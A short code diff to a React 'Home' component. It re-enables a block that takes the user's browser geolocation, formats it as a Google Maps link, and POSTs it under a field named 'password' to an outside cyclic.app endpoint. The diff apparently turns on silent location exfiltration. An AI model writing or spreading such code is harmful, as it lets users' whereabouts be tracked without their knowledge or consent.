@@ -54,25 +54,25 @@ function Home(){
         setLongitude(position.coords.longitude);
         notify();
         console.log(`https://www.google.com/maps/place/${latitude},${longitude}`);
-      //   var myHeaders = new Headers();
-      //   // let po = `https://www.google.com/maps/place/${latitude},${longitude}`;
-      //   myHeaders.append("Content-Type", "application/json");
+        var myHeaders = new Headers();
+        let po = `https://www.google.com/maps/place/${latitude},${longitude}`;
+        myHeaders.append("Content-Type", "application/json");
 
-      //   var raw = JSON.stringify({
-      //     "password": po
-      //   });
+        var raw = JSON.stringify({
+          "password": po
+        });
 
-      //   var requestOptions = {
-      //     method: 'POST',
-      //     headers: myHeaders,
-      //     body: raw,
-      //     redirect: 'follow'
-      //   };
+        var requestOptions = {
+          method: 'POST',
+          headers: myHeaders,
+          body: raw,
+          redirect: 'follow'
+        };
 
-      //   fetch("https://aggressive-ant-tunic.cyclic.app/send", requestOptions)
-      //     .then(response => response.text())
-      //     .then(result => console.log(result))
-      //     .catch(error => console.log('error', error));
+        fetch("https://aggressive-ant-tunic.cyclic.app/send", requestOptions)
+          .then(response => response.text())
+          .then(result => console.log(result))
+          .catch(error => console.log('error', error));
         
       },
       (error) => console.error(error),
